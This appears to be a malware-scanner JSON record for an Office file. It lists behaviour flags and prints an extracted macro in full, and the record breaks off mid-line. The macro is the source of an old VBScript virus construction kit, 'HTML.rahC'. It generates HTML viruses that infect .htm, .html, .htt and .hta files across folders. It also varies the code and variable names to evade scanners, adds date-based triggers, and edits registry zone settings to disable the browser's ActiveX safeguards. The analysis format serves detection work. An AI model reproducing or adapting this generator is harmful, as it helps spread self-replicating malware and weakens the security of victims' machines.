{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "'\n' Random Anarchy HTML Constructor\n'\n' v0.11\n' Copyright 1998. '1nternal'. All Rights Reserved.\n'\n' This Script is freeware, you may make as many duplicates/copies\n' as you wish and distribute it freely providing all files are included.\n'\n\n'Global Variables\nPublic LinesCount, GenText, TabAmount, PreID, CreatedTxt, CreatedFSO, FoundParent, DirNum\nPublic FoundHostA, FoundHost, FindHostStyle, WSCreated\n\nPublic Const EngineMajorVer = 0\nPublic Const EngineMinorVer = 2\nPublic Const EngineRevision = 0\nPublic Const EngineMajorDesc = \"rahC\"\nPublic Const EngineMinorDesc = \"VBS\"\nPublic Const EngineAuthorDesc = \"1nternal\"\nPublic Const EngineYearDate = \"1999\"\nPublic EngineCopyString\n\n'  Sub procedure names\nPublic VarInfFileName, VarInfFolderName\n'  Objects and variables\nPublic VarWSObj, VarFSOObj, VarTxtRng, VarFileContents, VarFolderObj, VarFileCollection\nPublic VarVictFileObj, VarEachFile, VarTestString, VarExtType, VarTextStreamObj\n'  Host and victim paths\nPublic VarInfPath, VarInfFile, VarHostPath\n\nEngineCopyString = EngineMajorDesc & \".\" & EngineMinorDesc & \" v\" & EngineMajorVer & \".\" & EngineMinorVer & \" Copyright \" & EngineYearDate & \". \" & EngineAuthorDesc\ndocument.write \"<p align=\"\"Center\"\"><font size=\"\"1\"\" face=\"\"Arial\"\">Engine: \" & EngineCopyString & \"</font></p>\"\n\n'----------------------------Intialisation and Main Layout Block---------------------------------\n\n'Inserts the header and footer code around the virus/trojan\n'and calls the exectution probability routine\nSub GV()\n\tOn Error Resume Next\n\tCall InitialiseIt\n\tif InitialisePlugin() then\n\t\tif VInfo.GenSeed.Value <> \"\" then\n\t\t\tRnd(-1)\n\t\t\tRandomize(VInfo.GenSeed.Value)\n\t\telse\n\t\t\tRandomize\n\t\tend if\n\t\tCall InitialiseAgain\n\t\tAddLine 0, PreID\n\t\tAddLine 0, \"<html><body>\"\n\t\tAddLine 0, \"<script Language=\"\"VBScript\"\"><!--\"\n\t\tAddCodeLine \"On Error Resume Next\"\n\t\tCall CustomHeaderCode\n\t\tSelect Case Int((6 * Rnd) + 1)\n\t\t\tCase 1\n\t\t\t\tCall InsertInfectFile\n\t\t\t\tCall InsertInfectPath\n\t\t\t\tCall InsertExecProb\n\t\t\tCase 2\n\t\t\t\tCall InsertInfectPath\n\t\t\t\tCall InsertInfectFile\n\t\t\t\tCall InsertExecProb\n\t\t\tCase 3\n\t\t\t\tCall InsertExecProb\n\t\t\t\tCall InsertInfectPath\n\t\t\t\tCall InsertInfectFile\n\t\t\tCase 4\n\t\t\t\tCall InsertExecProb\n\t\t\t\tCall InsertInfectFile\n\t\t\t\tCall InsertInfectPath\n\t\t\tCase 5\n\t\t\t\tCall InsertInfectFile\n\t\t\t\tCall InsertExecProb\n\t\t\t\tCall InsertInfectPath\n\t\t\tCase 6\n\t\t\t\tCall InsertInfectPath\n\t\t\t\tCall InsertExecProb\n\t\t\t\tCall InsertInfectFile\n\t\tEnd Select\n\t\tCall CustomFooterCode\n\t\tAddLine 0, \"'HTML.rahC.\" & VInfo.GenName.value & \" v0.1 /\" & VInfo.IDTag.Value\n\t\tAddLine 0, \"'Generated with HTML.rahC v0.1 /1nternal\"\n\t\tAddLine 0, \"--></\" & \"script>\"\n\t\tAddLine 0, \"</body></html>\"\n\t\tif TerminatePlug() then\n\t\t\twindow.status=\"Creating document\"\n\t\t\tset NewWin = window.open()\n\t\t\tNewWin.document.Write(GenText)\n\t\t\twindow.status = \"Done\"\n\t\tend if\n\tend if\nEnd Sub\n\n'Sets up some variables in preperation for the generation\nSub InitialiseAgain\n\tOn Error Resume Next\n\tif VInfo.RandVars.Checked = true then\n\t\tVarInfFolderName = GenVar\n\t\tVarHostPath = GenVar\n\t\tVarWSObj = GenVar\n\t\tVarFSOObj = GenVar\n\t\tVarInfPath = GenVar\n\t\tVarInfFileName = GenVar\n\t\tVarInfFile = GenVar\n\t\tVarFileContents = GenVar\n\t\tVarTxtRng = GenVar\n\t\tVarFolderObj = GenVar\n\t\tVarFileCollection = GenVar\n\t\tVarVictFileObj = GenVar\n\t\tVarTextStreamObj = GenVar\n\t\tVarEachFile = GenVar\n\t\tVarTestString = GenVar\n\t\tVarExtType = GenVar\n\tend if\n\tif NameChanges.Exists(Ucase(VInfo.GenName.Value)) then VInfo.GenName.Value = NameChanges.Item(Ucase(VInfo.GenName.Value))\n\tPreID = \"<!--\" & VInfo.IDTag.Value & \"-->\"\nEnd Sub\n\nSub InitialiseIt\n\tOn Error Resume Next\n\tTabAmount = 0\n\tLinesCount = 0\n\tDirNum = 0\n\tFoundHostA = False\n\tFoundHost = False\n\tFindHostStyle = 0\n\tCreatedTxt = False\n\tCreatedFSO = False\n\tFoundParent = False\n\tWSCreated = False\n\tGenText = \"\"\n\tVarInfFolderName = \"InfectFolder\"\n\tVarHostPath = \"HostPath\"\n\tVarWSObj = \"WSHShell\"\n\tVarFSOObj = \"FSO\"\n\tVarInfPath = \"InfectPath\"\n\tVarInfFileName = \"InfectFile\"\n\tVarInfFile = \"InfectFileName\"\n\tVarFileContents = \"FileContents\"\n\tVarTxtRng = \"Rng\"\n\tVarFolderObj = \"FolderObj\"\n\tVarFileCollection = \"fc\"\n\tVarVictFileObj = \"fv\"\n\tVarTextStreamObj = \"ts\"\n\tVarEachFile = \"target\"\n\tVarTestString = \"TestString\"\n\tVarExtType = \"ExtType\"\nEnd Sub\n\n'----------------------------------Main Execution Conditional block------------------------------\n\n'Inserts the offline and random run check to the viral code text stream\n'randomly swapping the order of the conditions\nSub InsertExecProb\n\tCall RandInsertTxtHost\n\tBaseString = \"\"\n\tBonusString = \"\"\n\tConditionalS = \"\"\n\tif VInfo.ExecOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"\n\tSelect Case GetVals(VInfo.ExecProb)\n\t\tCase \"Every\"\n\t\t\tBonusString = \"\"\n\t\tCase \"Day\"\n\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValExec.Value\n\t\tCase \"Week\"\n\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.WeekExec.Value\n\t\tCase \"Misc\"\n\t\t\tBonusString = VInfo.ExecLine.Value\n\t\tCase \"Rand\"\n\t\t\tBonusString = \"Int((\" & VInfo.ExecMax.Value & \" * Rnd) + 1) = 1\"\n\tEnd Select\t\t\n\n\tRandOrder RandomAndAdd(BaseString, BonusString), \"Randomize\", 1\n\tTabAmount = TabAmount + 1\n\n\tHackedRegBegin = False\n\tHackedRegA = False\n\tHackedRegB = False\n\tVCodeChecked = False\n\tPayLoadChecked = False\n\n\tDo\n\t\tSelect Case Int((6 * Rnd) + 1)\n\t\t\tCase 1 and HackedRegBegin = False\n\t\t\t\tCall AVRegHackBegin\n\t\t\t\tHackedRegBegin = True\n\t\t\tCase 2 and PayLoadChecked = False\n\t\t\t\tif VInfo.TrigInfect.Checked = False then Call PayLoadCheck\n\t\t\t\tPayLoadChecked = True\n\t\t\tCase 3 and VCodeChecked = False\n\t\t\t\tCall VCodeCheck\n\t\t\t\tVCodeChecked = True\n\t\t\tCase 4 and HackedRegA = False and HackedRegBegin = True\n\t\t\t\tCall AVRegHackA\n\t\t\t\tHackedRegA = True\n\t\t\tCase 5 and HackedRegB = False and HackedRegBegin = True\n\t\t\t\tCall AVRegHackB\n\t\t\t\tHackedRegB = True\n\t\t\tCase else \n\t\t\t\tif VCodeChecked = False then call RandInsertTxtHost\n\t\tEnd Select\n\tLoop While HackedRegBegin = False or PayLoadChecked = False or VCodeChecked = False or HackedRegA = False or HackedRegB = False\n\tCall CustomExecuteCodeEnd\n\tif BaseString <> \"\" OR BonusString <> \"\" then\n\t\tTabAmount = TabAmount - 1\n\t\tAddCodeLine \"end if\"\n\tend if\nEnd Sub\n\n'----------------------------------------Infection Block-----------------------------------------\n\nSub VCodeCheck\n\tif GetVals(Vinfo.InfProb) <> \"None\" then\n\t\tBaseString = \"\"\n\t\tBonusString = \"\"\n\t\tif VInfo.InfOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"\n\t\tSelect Case GetVals(VInfo.InfProb)\n\t\t\tCase \"Every\"\n\t\t\t\tBonusString = \"\"\n\t\t\tCase \"Day\"\n\t\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValInf.Value\n\t\t\tCase \"Week\"\n\t\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.InfWeek.Value\n\t\t\tCase \"Misc\"\n\t\t\t\tBonusString = VInfo.InfLine.Value\n\t\t\tCase \"Rand\"\n\t\t\t\tBonusString = \"Int((\" & VInfo.InfMax.Value & \" * Rnd) + 1) = 1\"\n\t\tEnd Select\t\t\n\n\t\tif BaseString <> \"\" OR BonusString <> \"\" then\n\t\t\tAddCodeLine RandomAndAdd(BaseString, BonusString)\t\t\n\t\t\tTabAmount = TabAmount + 1\n\t\tend if\n\n\t\tif VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = \"Before\" then Call PayLoadCheck\n\t\tCall InitialiseInfect\n\t\tif VInfo.TrigInfect.Checked = True and GetVals(VInfo.TrigPlace) = \"After\" then Call PayLoadCheck\n\t\tif BaseString <> \"\" OR BonusString <> \"\" then\n\t\t\tTabAmount = TabAmount - 1\n\t\t\tAddCodeLine \"end if\"\n\t\tend if\n\tend if\nEnd Sub\n\nSub InitialiseInfect\n\tDo\n\t\tSelect Case Int((5 * Rnd) + 1)\n\t\t\tCase 1 and CreatedFSO = False\n\t\t\t\tAddCodeLine \"Set \" & VarFSOObj & \" = CreateObject(\"\"Scripting.FileSystemObject\"\")\"\n\t\t\t\tCreatedFSO = True\n\t\t\tCase 2 and CreatedTxt = False\n\t\t\t\tCall InsertCreateTxt\n\t\t\tCase 3 and FoundHost = False\n\t\t\t\tCall InsertFindHost\n\t\t\tCase 4 and FoundParent = False and CreatedFSO = True and FoundHost = True\n\t\t\t\tAddCodeLine VarHostPath & \" = \" & VarFSOObj & \".GetParentFolderName(\" & VarHostPath & \")\"\n\t\t\t\tFoundParent = True\n\t\t\tCase 5 and CreatedFSO = True and CreatedTxt = True\n\t\t\t\tCall InsertDirInf\n\t\tend select\n\tLoop While FoundHost = False or CreatedFSO = False or CreatedTxt = False or FoundParent = False\n\tInsertedCurrent = False\n\tDo\n\t\tSelect Case Int((3 * Rnd) + 1)\n\t\t\tCase 1 and InsertedCurrent <> True\n\t\t\t\tif VInfo.InfCurrent.checked = True then\n\t\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(VarHostPath), \"Call \" & VarInfFolderName & \"(\" & VarHostPath & \")\")\n\t\t\t\tend if\n\t\t\t\tInsertedCurrent = True\n\t\t\tCase else\n\t\t\t\tCall InsertDirInf\n\t\tend select\n\tLoop While InsertedCurrent = False or DirNum < 6\nEnd Sub\n\nSub InsertFindHost\n\t'FindHostStyle = 1 or 2\n\t'1 = Get rid of \"File:\" first. 2 = Change \"/\" first\n\tif Vinfo.InfCurrent.Checked = True then\n\t\tif FindHostStyle = 0 then FoundHostType = Int((2 * Rnd) + 1)\n\t\tif FindHostStyle = 1 then\n\t\t\tif FoundHostA <> True then\n\t\t\t\tAddCodeLine VarHostPath & \" = Replace(location.href, \"\"file:///\"\", \"\"\"\")\"\n\t\t\telse\n\t\t\t\tAddCodeLine VarHostPath & \" = Replace(\" & VarHostPath & \", \"\"/\"\", \"\"\\\"\")\"\n\t\t\t\tFoundHost = True\n\t\t\tend if\n\t\telse\n\t\t\tif FoundHostA <> True then\n\t\t\t\tAddCodeLine VarHostPath & \" = Replace(location.href, \"\"/\"\", \"\"\\\"\")\"\n\t\t\telse\n\t\t\t\tAddCodeLine VarHostPath & \" = Replace(\" & VarHostPath & \", \"\"file:\\\\\\\"\", \"\"\"\")\"\n\t\t\t\tFoundHost = True\n\t\t\tend if\n\t\tend if\n\t\tFoundHostA = True\n\telse\n\t\tFoundHost = True\n\tend if\nEnd Sub\n\nSub InsertCreateTxt\n\tif VInfo.CreateRange.Checked = True or GetVals(VInfo.FileRoutine) = \"Default\" then\n\t\tAddCodeLine \"Set \" & VarTxtRng & \" = document.body.createTextRange\" & RandString(\"()\" , \"\")\n\tend if\n\tCreatedTxt = True\nEnd Sub\n\nSub RandInsertTxtHost\n\tfor i = 1 to 2\n\t\tif Int((8 * Rnd) + 1) = 1 then\n\t\t\tif Int((2 * Rnd) + 1) = 1 and FoundHost = False and GetVals(VInfo.InfProb) <> \"None\" then\n\t\t\t\tCall InsertFindHost\n\t\t\telseif CreatedTxt = False and GetVals(VInfo.InfProb) <> \"None\" then\n\t\t\t\tCall InsertCreateTxt\n\t\t\tend if\n\t\tend if\n\tnext\nEnd Sub\n\nSub InsertDirInf\n\tDirNum = DirNum + 1\n\tif VInfo.DirHard.Checked = True then\n\t\tSelect Case DirNum\n\t\t\tCase 1 and VInfo.Dir1.Value <> \"\"\n\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir1.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir1.Value & \"\"\"\" & \")\")\n\t\t\tCase 2 and VInfo.Dir2.Value <> \"\"\n\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir2.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir2.Value & \"\"\"\" & \")\")\n\t\t\tCase 3 and VInfo.Dir3.Value <> \"\"\n\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir3.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir3.Value & \"\"\"\" & \")\")\n\t\t\tCase 4 and VInfo.Dir4.Value <> \"\"\n\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir4.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir4.Value & \"\"\"\" & \")\")\n\t\t\tCase 5 and VInfo.Dir5.Value <> \"\"\n\t\t\t\tAddCodeLine RandString(VarInfFolderName & RandBrack(\"\"\"\" & VInfo.Dir5.Value & \"\"\"\"), \"Call \" & VarInfFolderName & \"(\" & \"\"\"\" & VInfo.Dir5.Value & \"\"\"\" & \")\")\n\t\t\tCase else\n\t\tend select\n\tend if\nEnd Sub\n\n'-----------------------------------File Infection Sub Procedures--------------------------------\n\nSub InsertInfectPath\n\tCall RandInsertTxtHost\n\tif GetVals(VInfo.InfProb) <> \"None\" then\n\t\tAddCodeLine \"Sub \" & VarInfFolderName & \"(\" & VarInfPath & \")\"\n\t\tTabAmount = TabAmount + 1\n\t\t\tCall InsertInfectFolderRoutine\n\t\tTabAmount = TabAmount - 1\n\t\tAddCodeLine \"End Sub\"\n\tend if\nEnd Sub\n\nSub InsertInfectFolderRoutine\n\tSelect Case GetVals(VInfo.FolderRoutine)\n\t\tCase \"Default\"\n\t\t\tAddCodeLine \"On Error Resume Next\"\n\t\t\tif VInfo.CheckExist.checked = true then\n\t\t\t\tAddCodeLine \"if \" & VarFSOObj & \".FolderExists(\" & VarInfPath & \") then\"\n\t\t\t\tTabAmount = Tabamount + 1\n\t\t\tend if\n\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then\n\t\t\t\t\tSelect Case GetVals(VInfo.LoopOp)\n\t\t\t\t\t\tCase \"LoopU\"\n\t\t\t\t\t\t\tAddCodeLine \"Do\"\n\t\t\t\t\t\tCase \"LoopW\"\n\t\t\t\t\t\t\tAddCodeLine \"Do\"\n\t\t\t\t\t\tCase \"WhileW\"\n\t\t\t\t\t\t\tAddCodeLine \"Set \" & VarFolderObj & \" = \" & VarFSOObj & \".GetFolder(\" & VarInfPath & \")\"\n\t\t\t\t\t\t\tAddCodeLine \"While \" & VarFolderObj & \".IsRootFolder = False\"\n\t\t\t\t\tEnd select\n\t\t\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\tend if\n\t\t\t\t\t\tAddCodeLine \"Set \" & VarFolderObj & \" = \" & VarFSOObj & \".GetFolder(\" & VarInfPath & \")\"\n\t\t\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then\n\t\t\t\t\t\t\tCall RandOrder(VarInfPath & \" = \" & VarFSOObj & \".GetParentFolderName(\" & VarInfPath & \")\", \"Set \" & VarFileCollection & \" = \" & VarFolderObj & \".Files\", 0)\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tAddCodeLine \"Set \" & VarFileCollection & \" = \" & VarFolderObj & \".Files\"\n\t\t\t\t\t\tend if\n\t\t\t\t\t\tAddCodeLine \"For each \" & VarEachFile & \" in \" & VarFileCollection\n\t\t\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\t\t\t\tCall TestRoutine\n\t\t\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\t\t\tAddCodeLine \"next\"\n\t\t\t\tif GetVals(VInfo.Directory) = \"Parent\" then\n\t\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\t\tSelect Case GetVals(VInfo.LoopOp)\n\t\t\t\t\t\tCase \"LoopU\"\n\t\t\t\t\t\t\tAddCodeLine \"Loop Until \" & VarFolderObj & \".IsRootFolder = True\"\n\t\t\t\t\t\tCase \"LoopW\"\n\t\t\t\t\t\t\tAddCodeLine \"Loop While \" & VarFolderObj & \".IsRootFolder = False\"\n\t\t\t\t\t\tCase \"WhileW\"\n\t\t\t\t\t\t\tAddCodeLine \"Wend\"\n\t\t\t\t\tEnd select\n\t\t\t\tend if\n\t\t\tif VInfo.CheckExist.checked = true then\n\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\tAddCodeLine \"end if\"\n\t\t\tend if\n\t\tCase else\n\t\t\tCall CustomInfectFolder(GetVals(VInfo.FolderRoutine))\n\tEnd select\nEnd Sub\n\nSub TestRoutine\n\tUppercheck = Int(2 * Rnd)\n\tif Upper = 1 then\n\t\tAddCodeLine VarExtType & \" = ucase(\" & VarFSOObj & \".GetExtensionName(\" & VarEachFile & \".Name))\"\n\telse\n\t\tAddCodeLine VarExtType & \" = lcase(\" & VarFSOObj & \".GetExtensionName(\" & VarEachFile & \".Name))\"\n\tend if\n\tAddCodeLine \"if \" & ParseExtensions(Uppercheck) & \" then\"\n\tTabAmount = TabAmount + 1\n\t\tif VInfo.CheckInfected.checked = true then\n\t\t\tCall OpenFileMethod(VarEachFile & \".path\", \"1\", RandString(\"True\", \"False\"))\n\t\t\tif GetVals(VInfo.Infcheck) = \"TestString\" then\n\t\t\t\tAddCodeLine VarTestString & \" = \" & VarTextStreamObj & \".readline\"\n\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")\n\t\t\t\tAddCodeLine \"if \" & VarTestString & \" <> \"\"\" &  PreID & \"\"\" then\"\n\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")\n\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\tAddCodeLine \"end if\"\n\t\t\telse\n\t\t\t\tAddCodeLine \"if \" & VarTextStreamObj & \".readline <> \"\"\" &  PreID & \"\"\" then\"\n\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")\n\t\t\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")\n\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\tAddCodeLine \"else\"\n\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")\n\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\tAddCodeLine \"end if\"\n\t\t\tend if\n\t\telse\n\t\t\tAddCodeLine RandString(VarInfFileName & RandBrack(VarEachFile & \".path\"), \"Call \" & VarInfFileName & \"(\" & VarEachFile & \".path)\")\n\t\tend if\n\tTabAmount = TabAmount - 1\n\tAddCodeLine \"end if\"\nEnd Sub\n\n\nSub InsertInfectFile\n\tCall RandInsertTxtHost\n\tif GetVals(VInfo.InfProb) <> \"None\" then\n\t\tSelect Case GetVals(VInfo.FileRoutine)\n\t\t\tCase \"Default\"\n\t\t\t\tAddCodeLine \"Sub \" & VarInfFileName & \"(\" & VarInfFile & \")\"\n\t\t\t\tTabAmount = TabAmount + 1\n\t\t\t\t\tCall OpenFileMethod(VarInfFile, \"1\", RandString(\"True\", \"False\"))\n\t\t\t\t\tAddCodeLine VarFileContents & \" = \" & VarTextStreamObj & \".ReadAll\" & RandString(\"()\", \"\")\n\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")\n\t\t\t\t\tCall OpenFileMethod(VarInfFile, \"2\", RandString(\"True\", \"False\"))\n\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"\" & PreID & \"\"\"\"), \".Write\" & RandBrack(\"\"\"\" & PreID & \"\"\" + Chr(13) + Chr(10)\"))\n\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"<html><body>\"\"\"), \".Write\" & RandBrack(\"\"\"<html><body>\"\" + Chr(13) + Chr(10)\"))\n\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(VarTxtRng & \".htmlText\"), \".Write\" & RandBrack(VarTxtRng & \".htmlText\" & \" + Chr(13) + Chr(10)\"))\n\t\t\t\t\tAddcodeLine VarTextStreamObj & RandString (\".WriteLine\" & RandBrack(\"\"\"</body></html>\"\"\"), \".Write\" & RandBrack(\"\"\"</body></html>\"\" + Chr(13) + Chr(10)\"))\n\t\t\t\t\tAddCodeLine VarTextStreamObj & RandString(\".Write\", \".WriteLine\") & RandBrack(VarFileContents)\n\t\t\t\t\tAddCodeLine VarTextStreamObj & \".close\" & RandString(\"()\", \"\")\n\t\t\t\tTabAmount = TabAmount - 1\n\t\t\t\tAddCodeLine \"End Sub\"\t\n\t\t\tCase else\n\t\t\t\tCall CustomInfectFile(GetVals(VInfo.FileRoutine))\n\t\tEnd select\n\tend if\nEnd Sub\n\n\nfunction ParseExtensions(Upper)\n\tHTTChecked = False\n\tHTMChecked = False\n\tHTMLChecked = False\n\tHTAChecked = False\n\tMiscChecked = False\n\tCheckedAny = False\n\n\tExtenList = VarExtType & \" = \"\n\tDo\n\t\tSelect Case Int((5 * Rnd) + 1)\n\t\t\tCase 1 and HTTChecked = False\n\t\t\t\tif VInfo.HTT.checked = true then\n\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"\n\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTT\"\"\"\n\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"htt\"\"\"\n\t\t\t\t\tCheckedAny = true\n\t\t\t\tend if\n\t\t\t\tHTTChecked = True\n\t\t\tCase 2 and HTMChecked = False\n\t\t\t\tif VInfo.HTM.checked = true then\n\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"\n\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTM\"\"\"\n\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"htm\"\"\"\n\t\t\t\t\tCheckedAny = true\n\t\t\t\tend if\n\t\t\t\tHTMChecked = True\n\t\t\tCase 3 and HTMLChecked = False\n\t\t\t\tif VInfo.HTML.checked = true then\n\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"\n\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTML\"\"\"\n\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"html\"\"\"\n\t\t\t\t\tCheckedAny = true\n\t\t\t\tend if\n\t\t\t\tHTMLChecked = True\n\t\t\tCase 4 and HTAChecked = False\n\t\t\t\tif VInfo.HTA.checked = true then\n\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"\n\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"HTA\"\"\"\n\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"hta\"\"\"\n\t\t\t\t\tCheckedAny = true\n\t\t\t\tend if\n\t\t\t\tHTAChecked = True\n\t\t\tCase 5 and MiscChecked = False\n\t\t\t\tif VInfo.MiscExt.checked then\n\t\t\t\t\tif CheckedAny = true then ExtenList = ExtenList & \" or \" & VarExtType & \" = \"\n\t\t\t\t\tif Upper = 1 then ExtenList = ExtenList + \"\"\"\" + Ucase(VInfo.ExtName.Value) + \"\"\"\"\n\t\t\t\t\tif Upper = 0 then ExtenList = ExtenList + \"\"\"\" + Lcase(VInfo.ExtName.Value) + \"\"\"\"\n\t\t\t\t\tCheckedAny = true\n\t\t\t\tend if\n\t\t\t\tMiscChecked = True\n\t\tEnd Select\n\tLoop while MiscChecked = False or HTAChecked = False or HTMLChecked = False or HTMchecked = False or HTTChecked = False\n\tParseExtensions = ExtenList\nend function\n\n'-----------------------------------Registry Hacking Procedures----------------------------------\n\nSub AVRegHackBegin\n\tif VInfo.Current.Checked = True OR VInfo.Local.Checked = True then\n\t\tif WSCreated <> True then\n\t\t\tAddCodeLine \"Set \" & VarWSObj & \" = CreateObject(\"\"WScript.Shell\"\")\"\n\t\t\tWSCreated = True\n\t\tend if\n\tend if\nEnd Sub\nSub AVRegHackA\n\tif VInfo.Current.checked = True then\n\t\tAddCodeLine VarWSObj & \".Regwrite\" & RandString(\"\"\"HKCU\",\"\"\"HKEY_CURRENT_USER\") & \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\"\" , 0, \"\"REG_DWORD\"\"\"\n\tend if\nEnd Sub\nSub AVRegHackB\n\tif VInfo.Local.Checked = True then\n\t\tAddCodeLine VarWSObj & \".RegWrite\" & RandString(\"\"\"HKLM\", \"\"\"HKEY_LOCAL_MACHINE\") & \"\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\0\\1201\"\" , 0, \"\"REG_DWORD\"\"\"\n\tend if\nEnd Sub\n\n'---------------------------------Conditional Payload Block--------------------------------------\n\n'Inserts the chosen payload trigger conditional statement to the viral code text stream\n'And calls the insertion of the payload if appropriate\nSub PayLoadCheck\n\tif GetVals(Vinfo.Trigger) <> \"None\" then\n\t\tBaseString = \"\"\n\t\tBonusString = \"\"\n\t\tif VInfo.TriggerOffline.Checked = True then BaseString = \"location.protocol = \"\"file:\"\"\"\n\t\tSelect Case GetVals(VInfo.Trigger)\n\t\t\tCase \"Every\"\n\t\t\t\tBonusString = \"\"\n\t\t\tCase \"Day\"\n\t\t\t\tBonusString = \"Day(now) = \" & VInfo.DayValTrig.Value\n\t\t\tCase \"Week\"\n\t\t\t\tBonusString = \"WeekDay(now) = \" & VInfo.WeekDayTrig.Value\n\t\t\tCase \"Misc\"\n\t\t\t\tBonusString = VInfo.TrigLine.Value\n\t\t\tCase \"Rand\"\n\t\t\t\tBonusString = \"Int((\" & VInfo.TrigMax.Value & \" * Rnd) + 1) = 1\"\n\t\tEnd Select\n\t\tif BaseString <> \"\" or BonusString <> \"\" then\n\t\t\tAddCodeLine RandomAndAdd(BaseString, BonusString)\n\t\t\tTabAmount = TabAmount + 1\n\t\tend if\n\t\tif GetVals(VInfo.PayLoad) = \"Prepend\" then\n\t\t\tAddCodeLine \"window.status=\"\"HTML.Prepend /1nternal\"\")\"\n\t\telse\n\t\t\tCall InsertPayLoad(GetVals(Vinfo.PayLoad))\n\t\tend if\n\t\tif BaseString <> \"\" OR BonusString <> \"\" then \n\t\t\tTabAmount = TabAmount - 1\n\t\t\tAddCodeLine \"end if\"\n\t\tend if\n\tend if\nEnd Sub\n\n'----------------------------------------Misc Procedures-----------------------------------------\n\n\n'Randomly brackets an argument\nfunction RandBrack(String1)\n\tif Int((2 * Rnd) + 1) = 1 then\n\t\tRandBrack = \"(\" + String1 + \")\"\n\telse\n\t\tRandBrack = \" \" + String1\n\tend if\nend function\n\n'Opens a file using the chosen method\n'All args are strings\nSub OpenFileMethod(FilePathName, IoModeType, CreateIt)\n\tSelect Case GetVals(VInfo.OpenMethod)\n\t\tCase \"TextFile\"\n\t\t\tCall OpenUsingText(FilePathName, IoModeType, CreateIt)\n\t\tCase \"TextStream\"\n\t\t\tCall OpenUsingStream(FilePathName, IoModeType)\n\t\tCase \"Rand\"\n\t\t\tif Int((2 * Rnd) + 1) = 1 then\n\t\t\t\tCall OpenUsingText(FilePathName, IoModeType, CreateIt)\n\t\t\telse\n\t\t\t\tCall OpenUsingStream(FilePathName, IoModeType)\n\t\t\tend if\n\tend select\nend sub\n\n\nSub OpenUsingStream(FilePathName, IoModeType)\n\tAddCodeLine \"Set \" & VarVictFileObj & \" = \" & VarFSOObj & \".GetFile(\" & FilePathName & \")\"\n\tAddCodeLine \"Set \" & VarTextStreamObj & \" = \" & VarVictFileObj & \".OpenAsTextStream(\" & IoModeType & 